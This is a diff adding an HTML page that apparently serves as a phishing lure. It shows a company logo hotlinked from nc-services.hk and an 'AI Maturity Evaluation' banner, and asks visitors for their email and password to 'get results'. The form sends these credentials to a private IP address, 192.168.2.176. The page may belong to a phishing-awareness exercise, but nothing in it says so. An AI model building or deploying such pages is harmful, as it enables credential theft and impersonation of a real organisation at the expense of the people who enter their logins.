@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>AI Maturity Results</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background: linear-gradient(135deg, #e9efff 0%, #f7fafc 100%);
+            font-family: 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        .center-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .logo {
+            width: 18vw;
+            max-width: 240px;
+            min-width: 80px;
+            margin-bottom: 4vh;
+        }
+        .container {
+            width: 90vw;
+            max-width: 400px;
+            background: #fff;
+            border-radius: 14px;
+            box-shadow: 0 6px 32px rgba(44, 62, 80, 0.10);
+            padding: 40px 30px 32px 30px;
+            text-align: center;
+        }
+        h1 {
+            color: #22304a;
+            font-size: 2em;
+            margin-bottom: 24px;
+            font-weight: 600;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 22px;
+            align-items: flex-start;
+        }
+        input[type="email"], input[type="password"] {
+            width: 340px;
+            max-width: 80vw;
+            padding: 18px 14px;
+            font-size: 1.25em;
+            border: 1.5px solid #cfd8dc;
+            border-radius: 8px;
+            outline: none;
+            transition: border 0.2s;
+            box-sizing: border-box;
+        }
+        input[type="email"]:focus, input[type="password"]:focus {
+            border: 1.5px solid #2563eb;
+        }
+        button {
+            background: #2563eb;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 16px 38px;
+            font-size: 1.25em;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            align-self: flex-start;
+            margin-top: 8px;
+        }
+        button:hover {
+            background: #1742a0;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 18px 4vw 16px 4vw;
+            }
+            .logo {
+                width: 28vw;
+            }
+            input[type="email"], input[type="password"] {
+                width: 100%;
+                font-size: 1.1em;
+            }
+            button {
+                font-size: 1.1em;
+                padding: 14px 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="center-wrapper">
+        <img class="logo" src="https://nc-services.hk/wp-content/themes/theme-suma/front-end/assets/images/logo.svg" alt="Company Logo">
+        <div class="container">
+            <h1 align=" left">AI Maturity Evaluation<br>Get your Results</h1>
+            <form method="post" action="http://192.168.2.176/8080">
+                <input type="email" name="email" placeholder="Email address" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Get Results</button>
+            </form>
+            <div id="message" style="margin-top:18px;color:#2563eb;font-weight:500;"></div>
+        </div>
+    </div>
+</body>
+</html>
